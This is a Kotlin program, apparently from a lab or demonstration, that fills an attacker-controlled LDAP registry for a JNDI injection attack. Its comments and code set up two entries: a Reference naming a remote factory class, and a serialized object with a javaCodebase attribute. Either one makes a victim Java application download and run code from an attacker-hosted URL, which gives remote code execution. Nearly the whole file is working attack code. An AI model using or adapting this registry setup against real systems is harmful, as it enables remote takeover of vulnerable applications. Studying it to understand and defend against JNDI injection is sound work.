// Initialize the LDAP registry
//
// The victim will query the LDAP registry for a class. There are two things we
// can return.
//
// Option 1: References
// --------------------
// We can to return a `Reference` to an object. It will have the name of the
// class of the object, as well as a factory to use to make it. This factory
// class will then be downloaded an attacker-controlled URL and executed on the
// victim.
//
// Option 2: Serialized Objects
// ----------------------------
// Alternatively, we can return an object that was serialized and put in the
// registry. There is no trickery here with factory classes. It gets the data
// associated with the *object*, then downloads the corresponding *class* from
// an attacker-controlled URL.
//
// This Kotlin program just initializes the LDAP registry with both options.
// This would more practically be done with an LDIF file, but this can work too.
// For Option 1, it puts at `cn=made-class,dc=ldap-registry,dc=attacker` a
// `Reference` to an object of type `MadeClass`. It specifies that the class
// `FactoryClass` should be used to construct it, and that the `.class` files
// for both of these classes can be found at a particular URL. For Option 2, it
// puts the serialized data at `cn=serialized-class` with the same domain
// components as above.


import java.util.Hashtable

import javax.naming.Context
import javax.naming.directory.DirContext
import javax.naming.directory.InitialDirContext

import javax.naming.Reference
import javax.naming.directory.BasicAttributes

import javax.naming.CommunicationException


// Default addresses to use in case none were specified at the command-line
val DEFAULT_ATTACKER_LDAP_REGISTRY_URL = "ldap://localhost:1389/dc=ldap-registry,dc=attacker"
val DEFAULT_ATTACKER_CODEBASE_URL      = "http://localhost:8080/"

fun main() {

    // What LDAP registry to use
    // This will point the victim to a class name and a factory to pass that
    //  name to. The factory will be invoked, causing RCE.
    val attacker_ldap_registry_url =
        System.getProperty("attacker-ldap-registry-url") ?: DEFAULT_ATTACKER_LDAP_REGISTRY_URL
    // Where the codebase is
    // The attacker must host the factory class somewhere, probably on an HTTP
    //  server. This is where the victim will download code from
    val attacker_codebase_url =
        System.getProperty("attacker-codebase-url") ?: DEFAULT_ATTACKER_CODEBASE_URL

    // Create a Hashtable for the configuration
    // Yes, it must be a Hashtable
    var env = Hashtable<String, String>()

    // Put the location of the registry we want to use for JNDI
    env.put(
        Context.PROVIDER_URL,
        attacker_ldap_registry_url)
    // Specify what the backend for JNDI should be
    // We're using LDAP
    env.put(
        Context.INITIAL_CONTEXT_FACTORY,
        "com.sun.jndi.ldap.LdapCtxFactory")
    // Authenticate as the administrator
    env.put(
        Context.SECURITY_AUTHENTICATION,
        "simple")
    env.put(
        Context.SECURITY_PRINCIPAL,
        "cn=admin,dc=ldap-registry,dc=attacker")
    env.put(
        Context.SECURITY_CREDENTIALS,
        "admin")

    // Construct a context using the helper function
    // The server might not be up when we first start this service, so we loop
    //  until we're able to connect. That's all the helper function does. Aside
    //  from the looping, it just does `InitialContext(env)`.
    var ctx: DirContext? = null
    while(ctx == null) {
        try {
            // The server might prematurely accept our connection
            // Resolve this in the most jank way possible - by sleeping. It
            //  takes about two seconds for the setup to finish on my computer,
            //  so sleep for five.
            ctx = InitialDirContext(env)
            println("Connected!")
            Thread.sleep(5000)

        } catch(_: CommunicationException) {
            println("Failed to connect.")
            println("Retrying after 1 second...")
            Thread.sleep(1000)
        }
    }

    // Add the reference to the registry
    ctx.rebind(
        "cn=made-class",
        Reference("MadeClass", "FactoryClass", attacker_codebase_url),
    )
    // Same for the serialized class
    // Need to manually add the codebase
    ctx.rebind(
        "cn=serialized-class",
        SerializedClass("Serialized Object's Message"),
        BasicAttributes("javaCodebase", attacker_codebase_url),
    )

    // For good measure
    ctx.close()
}
